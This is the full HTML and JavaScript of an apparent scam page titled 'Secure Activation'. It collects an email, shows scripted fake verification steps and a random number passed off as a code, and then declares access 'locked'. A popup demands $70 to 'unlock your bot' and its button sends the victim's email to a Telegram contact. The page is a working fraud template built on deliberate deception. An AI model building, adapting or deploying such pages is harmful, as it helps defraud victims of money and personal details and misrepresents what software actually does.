<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Activation</title>

<style>
body {
    margin:0;
    font-family: Arial;
    background:#0b0f1a;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container {
    background:#12182b;
    padding:30px;
    border-radius:12px;
    width:360px;
    text-align:center;
}

input {
    width:100%;
    padding:12px;
    margin:10px 0;
    border:none;
    border-radius:8px;
    background:#1e2745;
    color:#fff;
}

button {
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#4a6cff;
    color:#fff;
    font-weight:bold;
}

.code {
    font-size:28px;
    color:#00ffcc;
    margin:20px 0;
}

.overlay {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,0.8);
    display:flex;
    justify-content:center;
    align-items:center;
    opacity:0;
    pointer-events:none;
}

.overlay.active {
    opacity:1;
    pointer-events:auto;
}

.modal {
    background:#12182b;
    padding:20px;
    border-radius:10px;
    width:300px;
}

.amount {
    font-size:26px;
    color:#00ffcc;
}
</style>
</head>

<body>

<div class="container" id="main">

<h2>🔐 Secure Access</h2>

<input type="email" id="email" placeholder="Enter your email">

<button onclick="start()">Continue</button>

<div id="verify" style="display:none;">
<p id="emailShow"></p>
<p id="userShow" style="color:#00ffcc;"></p>

<div class="code" id="code">------</div>
<p id="status">Initializing...</p>
</div>

</div>

<!-- POPUP -->
<div class="overlay" id="overlay">
  <div class="modal">
    <h3>Activate Access</h3>
    <p>Activation required to unlock your bot</p>
    <div class="amount">$70.00</div>

    <button onclick="activate()">Activate Now</button>
  </div>
</div>

<script>
function start() {
    let email = document.getElementById("email").value;
    if(!email) return alert("Enter email");

    let username = email.split("@")[0];

    document.getElementById("verify").style.display = "block";
    document.getElementById("emailShow").innerText = email;
    document.getElementById("userShow").innerText = username;

    let code = Math.floor(100000 + Math.random()*900000);
    document.getElementById("code").innerText = code;

    let steps = [
        "Sending code...",
        "Verifying...",
        "Securing session...",
        "Access locked"
    ];

    let i=0;
    let int = setInterval(()=>{
        document.getElementById("status").innerText = steps[i];
        i++;
        if(i===steps.length){
            clearInterval(int);
            setTimeout(()=>{
                document.getElementById("overlay").classList.add("active");
            },500);
        }
    },1200);
}

// ⚠️ Email API key NOT included for safety
// This opens Telegram + passes email
function activate(){
    let email = document.getElementById("email").value;

    window.location.href =
    "https://t.me/hacyberglobaltech?text=Hello%20I%20clicked%20activation%20Email:%20"+encodeURIComponent(email);
}
</script>

</body>
</html>
